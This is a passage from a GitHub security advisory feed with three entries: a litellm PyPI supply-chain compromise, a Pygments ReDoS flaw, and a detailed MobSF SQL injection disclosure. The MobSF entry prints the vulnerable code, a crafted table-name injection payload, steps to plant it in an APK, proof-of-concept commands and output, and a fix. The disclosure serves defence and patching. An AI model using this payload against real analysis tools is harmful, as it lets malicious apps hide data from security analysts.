        <content type="html"><![CDATA[<p>After an API Token exposure from an exploited trivy dependency, two new releases of <code>litellm</code> were uploaded to PyPI containing automatically activated malware, harvesting sensitive credentials and files, and exfiltrating to a remote API.</p>
<p>Anyone who has installed and run the project should assume any credentials available to litellm environment may have been exposed, and revoke/rotate thema ccordingly.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BerriAI/litellm/issues/24518">https://github.com/BerriAI/litellm/issues/24518</a></li>
<li><a href="https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack">https://futuresearch.ai/blog/litellm-pypi-supply-chain-attack</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/litellm/PYSEC-2026-2.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/litellm/PYSEC-2026-2.yaml</a></li>
<li><a href="https://inspector.pypi.io/project/litellm/1.82.7/packages/79/5f/b6998d42c6ccd32d36e12661f2734602e72a576d52a51f4245aef0b20b4d/litellm-1.82.7-py3-none-any.whl/litellm/proxy/proxy_server.py#line.130">https://inspector.pypi.io/project/litellm/1.82.7/packages/79/5f/b6998d42c6ccd32d36e12661f2734602e72a576d52a51f4245aef0b20b4d/litellm-1.82.7-py3-none-any.whl/litellm/proxy/proxy_server.py#line.130</a></li>
<li><a href="https://inspector.pypi.io/project/litellm/1.82.8/packages/f6/2c/731b614e6cee0bca1e010a36fd381fba69ee836fe3cb6753ba23ef2b9601/litellm-1.82.8.tar.gz/litellm-1.82.8/litellm_init.pth#line.1">https://inspector.pypi.io/project/litellm/1.82.8/packages/f6/2c/731b614e6cee0bca1e010a36fd381fba69ee836fe3cb6753ba23ef2b9601/litellm-1.82.8.tar.gz/litellm-1.82.8/litellm_init.pth#line.1</a></li>
<li><a href="https://www.wiz.io/blog/teampcp-attack-kics-github-action">https://www.wiz.io/blog/teampcp-attack-kics-github-action</a></li>
<li><a href="https://docs.litellm.ai/blog/security-update-march-2026">https://docs.litellm.ai/blog/security-update-march-2026</a></li>
<li><a href="https://github.com/advisories/GHSA-5mg7-485q-xm76">https://github.com/advisories/GHSA-5mg7-485q-xm76</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5mg7-485q-xm76</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-25T14:25:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Pygments] Pygments has Regular Expression Denial of Service (ReDoS) due to Inefficient Regex for GUID Matching]]></title>
        <id>https://github.com/advisories/GHSA-5239-wwwm-4pmq</id>
        <link href="https://github.com/advisories/GHSA-5239-wwwm-4pmq"/>
        <updated>2026-03-24T20:33:40.000Z</updated>
        <content type="html"><![CDATA[<p>A security flaw has been discovered in pygments up to 2.19.2. The impacted element is the function AdlLexer of the file pygments/lexers/archetype.py. The manipulation results in inefficient regular expression complexity. The attack is only possible with local access. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-4539">https://nvd.nist.gov/vuln/detail/CVE-2026-4539</a></li>
<li><a href="https://github.com/pygments/pygments/issues/3058">https://github.com/pygments/pygments/issues/3058</a></li>
<li><a href="https://github.com/pygments/pygments">https://github.com/pygments/pygments</a></li>
<li><a href="https://vuldb.com/?ctiid.352327">https://vuldb.com/?ctiid.352327</a></li>
<li><a href="https://vuldb.com/?id.352327">https://vuldb.com/?id.352327</a></li>
<li><a href="https://vuldb.com/?submit.774685">https://vuldb.com/?submit.774685</a></li>
<li><a href="https://github.com/advisories/GHSA-5239-wwwm-4pmq">https://github.com/advisories/GHSA-5239-wwwm-4pmq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5239-wwwm-4pmq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-03-22T06:30:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mobsf] MobSF has SQL Injection in its SQLite Database Viewer Utils]]></title>
        <id>https://github.com/advisories/GHSA-hqjr-43r5-9q58</id>
        <link href="https://github.com/advisories/GHSA-hqjr-43r5-9q58"/>
        <updated>2026-03-24T19:23:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="description">Description</h2>
<p>MobSF's <code>read_sqlite()</code> function in <code>mobsf/MobSF/utils.py</code> (lines 542-566) uses Python string formatting (<code>%</code>) to construct SQL queries with table names read from a SQLite database's <code>sqlite_master</code> table. When a security analyst uses MobSF to analyze a malicious mobile application containing a crafted SQLite database, attacker-controlled table names are interpolated directly into SQL queries without parameterization or escaping.</p>
<p>This allows an attacker to:</p>
<ol>
<li><p><strong>Cause Denial of Service</strong> -- A malicious table name causes the database viewer to crash, preventing the analyst from viewing ANY data in the SQLite database. A malicious app can use this to hide sensitive data (C2 server URLs, stolen credentials, API keys) from MobSF's analysis.</p>
</li>
<li><p><strong>Achieve SQL Injection</strong> -- The <code>SELECT * FROM</code> query on line 557 is provably injectable via <code>UNION SELECT</code>, allowing attacker-controlled data to be returned in query results. The current code structure (a <code>PRAGMA</code> statement that runs first on line 553) limits the full exploitation chain, but the underlying code is verifiably injectable.</p>
</li>
</ol>
<h2 id="root-cause">Root Cause</h2>
<p>The vulnerable code in <code>mobsf/MobSF/utils.py:542-566</code>:</p>
<pre><code class="language-python">def read_sqlite(sqlite_file):
    """Sqlite Dump - Readable Text."""
    table_dict = {}
    try:
        con = sqlite3.connect(sqlite_file)
        cur = con.cursor()
        cur.execute('SELECT name FROM sqlite_master WHERE type=\'table\';')
        tables = cur.fetchall()
        for table in tables:
            table_dict[table[0]] = {'head': [], 'data': []}
            cur.execute('PRAGMA table_info(\'%s\')' % table)    # &lt;-- INJECTION POINT 1
            rows = cur.fetchall()
            for sq_row in rows:
                table_dict[table[0]]['head'].append(sq_row[1])
            cur.execute('SELECT * FROM \'%s\'' % table)         # &lt;-- INJECTION POINT 2
            rows = cur.fetchall()
            for sq_row in rows:
                tmp_row = []
                for each_row in sq_row:
                    tmp_row.append(str(each_row))
                table_dict[table[0]]['data'].append(tmp_row)
    except Exception:
        logger.exception('Reading SQLite db')
    return table_dict
</code></pre>
<p><strong>Lines 553 and 557</strong> use <code>%</code> string formatting to interpolate <code>table</code> (a tuple from <code>sqlite_master</code>) directly into SQL strings. The <code>table</code> value is attacker-controlled when the SQLite database originates from a malicious application being analyzed.</p>
<h2 id="attack-vector">Attack Vector</h2>
<p>The <code>read_sqlite()</code> function is called from two locations:</p>
<ol>
<li><p><strong>Dynamic Analysis File Viewer</strong> (<code>mobsf/DynamicAnalyzer/views/common/device.py:64</code>):</p>
<ul>
<li>Triggered when an analyst clicks to view a <code>.db</code> file in device data</li>
<li>Applies to both Android and iOS dynamic analysis</li>
</ul>
</li>
<li><p><strong>iOS Static Analysis File Viewer</strong> (<code>mobsf/StaticAnalyzer/views/ios/views/view_source.py:123</code>):</p>
<ul>
<li>Triggered when an analyst clicks to view a <code>.db</code> file during iOS static analysis</li>
</ul>
</li>
</ol>
<h3 id="attack-scenario">Attack Scenario</h3>
<ol>
<li>Attacker creates a malicious Android APK (or iOS IPA) containing a SQLite database with a crafted table name in the <code>assets/</code> directory</li>
<li>The SQLite database contains a table created with:<pre><code class="language-sql">CREATE TABLE "x' UNION SELECT 'SQL_INJECTION_PROOF'--" (id INTEGER);
</code></pre>
</li>
<li>Security analyst uploads the application to MobSF for analysis</li>
<li>Analyst browses the extracted files and clicks to view the SQLite database</li>
<li>MobSF's <code>read_sqlite()</code> reads table names from <code>sqlite_master</code>, including the malicious name <code>x' UNION SELECT 'SQL_INJECTION_PROOF'--</code></li>
<li>The table name is interpolated into SQL queries via string formatting:<ul>
<li><code>PRAGMA table_info('x' UNION SELECT 'SQL_INJECTION_PROOF'--')</code> -- causes syntax error (DoS)</li>
<li><code>SELECT * FROM 'x' UNION SELECT 'SQL_INJECTION_PROOF'--'</code> -- SQL injection (UNION SELECT returns attacker data)</li>
</ul>
</li>
</ol>
<h2 id="impact">Impact</h2>
<h3 id="denial-of-service-confirmed">Denial of Service (Confirmed)</h3>
<p>When the malicious table name is the first table in <code>sqlite_master</code> (i.e., created first in the database), the <code>PRAGMA</code> statement on line 553 raises a <code>sqlite3.OperationalError</code>, which is caught by the outer <code>try/except</code>. This causes <code>read_sqlite()</code> to return an empty or partial result, preventing the analyst from viewing <strong>any</strong> database content.</p>
<p><strong>Security impact:</strong> A malicious app author can use this technique to <strong>hide incriminating data</strong> stored in SQLite databases from MobSF's analysis. This directly undermines MobSF's core purpose as a security analysis tool.</p>
<h3 id="sql-injection-confirmed-in-isolation">SQL Injection (Confirmed in Isolation)</h3>
<p>The <code>SELECT * FROM</code> query on line 557 is demonstrably injectable. When the malicious table name <code>x' UNION SELECT 'SQL_INJECTION_PROOF'--</code> is interpolated, the resulting query:</p>
<pre><code class="language-sql">SELECT * FROM 'x' UNION SELECT 'SQL_INJECTION_PROOF'--'
</code></pre>
<p>Successfully executes and returns attacker-controlled data via <code>UNION SELECT</code>. The <code>--</code> comments out the trailing single quote. This is verified by the PoC script.</p>
<p><strong>Note:</strong> In the current code structure, the <code>PRAGMA table_info()</code> statement on line 553 runs before the <code>SELECT * FROM</code> on line 557. The PRAGMA fails with a syntax error for injected payloads, which triggers the exception handler before the SELECT can execute. This limits the full exploitation chain. However, the code flaw is real and any future refactoring that changes the execution order or removes the PRAGMA would immediately expose the full SQL injection.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<h3 id="files-providedgdrive">Files Provided(Gdrive)</h3>
<table>
<thead>
<tr>
<th>File</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td><code>poc_sqlite_injection.py</code></td>
<td>Standalone PoC demonstrating the vulnerability</td>
</tr>
<tr>
<td><code>malicious.db</code></td>
<td>Crafted SQLite database (generated by PoC)</td>
</tr>
<tr>
<td><code>create_malicious_apk.sh</code></td>
<td>Script to package the malicious DB into an APK</td>
</tr>
<tr>
<td><code>malicious_sqli.apk</code></td>
<td>Pre-built APK for testing against MobSF</td>
</tr>
</tbody></table>
<p><a href="https://drive.google.com/drive/folders/1mNGkFfNowkaZ5J018HFi4IQcnjKaWCym?usp=sharing">https://drive.google.com/drive/folders/1mNGkFfNowkaZ5J018HFi4IQcnjKaWCym?usp=sharing</a></p>
<h3 id="running-the-poc">Running the PoC</h3>
<pre><code class="language-bash"># Run the standalone PoC (no MobSF required)
python3 poc_sqlite_injection.py

# Build the malicious APK (requires Android SDK)
./create_malicious_apk.sh

# Test against MobSF
# 1. Start MobSF
# 2. Upload malicious_sqli.apk
# 3. Browse extracted files -&gt; click app_data.db
# 4. Observe: database viewer fails (DoS)
</code></pre>
<h3 id="poc-output-abbreviated">PoC Output (Abbreviated)</h3>
<pre><code>[STEP 2] Running MobSF's read_sqlite() against malicious database...
    [!] EXCEPTION CAUGHT: OperationalError: near "UNION": syntax error
    [!] DoS CONFIRMED: read_sqlite() crashed

[STEP 3] Demonstrating SELECT * FROM injection in isolation...
    Query: SELECT * FROM 'x' UNION SELECT 'SQL_INJECTION_PROOF'--'
    [+] Query executed successfully!
    [+] Results: [('SQL_INJECTION_PROOF',), ('normal_data',)]
    [+] SQL INJECTION CONFIRMED

[STEP 4] Complete DoS (malicious table created first):
    Tables with data: NONE
    [!] COMPLETE DoS CONFIRMED
</code></pre>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Replace string formatting with properly quoted identifiers. SQLite uses double quotes for identifiers:</p>
<pre><code class="language-python">def read_sqlite(sqlite_file):
    """Sqlite Dump - Readable Text."""
    table_dict = {}
    try:
        con = sqlite3.connect(sqlite_file)
        cur = con.cursor()
        cur.execute('SELECT name FROM sqlite_master WHERE type=\'table\';')
        tables = cur.fetchall()
        for table in tables:
            table_name = table[0]
            # Properly escape table name as a double-quoted identifier
            safe_name = table_name.replace('"', '""')
            table_dict[table_name] = {'head': [], 'data': []}
            cur.execute(f'PRAGMA table_info("{safe_name}")')
            rows = cur.fetchall()
            for sq_row in rows:
                table_dict[table_name]['head'].append(sq_row[1])
            cur.execute(f'SELECT * FROM "{safe_name}"')
            rows = cur.fetchall()
            for sq_row in rows:
                tmp_row = []
                for each_row in sq_row:
                    tmp_row.append(str(each_row))
                table_dict[table_name]['data'].append(tmp_row)
    except Exception:
        logger.exception('Reading SQLite db')
    return table_dict
</code></pre>
<p>This escapes any double quotes within table names by doubling them (<code>"</code> → <code>""</code>), which is the standard SQL mechanism for identifier quoting. This prevents breakout from the double-quoted identifier context.</p>
<h2 id="resources">Resources</h2>
<ul>
<li><strong>CWE-89</strong>: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</li>
<li><strong>OWASP SQL Injection</strong>: <a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></li>
<li><strong>Affected File</strong>: <code>mobsf/MobSF/utils.py</code>, lines 542-566</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-hqjr-43r5-9q58">https://github.com/MobSF/Mobile-Security-Framework-MobSF/security/advisories/GHSA-hqjr-43r5-9q58</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/6f8a43c1b78d21cfbd7186aaafa7f622d990e0f1">https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/6f8a43c1b78d21cfbd7186aaafa7f622d990e0f1</a></li>
<li><a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.4.6">https://github.com/MobSF/Mobile-Security-Framework-MobSF/releases/tag/v4.4.6</a></li>
<li><a href="https://github.com/advisories/GHSA-hqjr-43r5-9q58">https://github.com/advisories/GHSA-hqjr-43r5-9q58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hqjr-43r5-9q58</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-03-24T19:23:52.000Z</published>
    </entry>
</feed>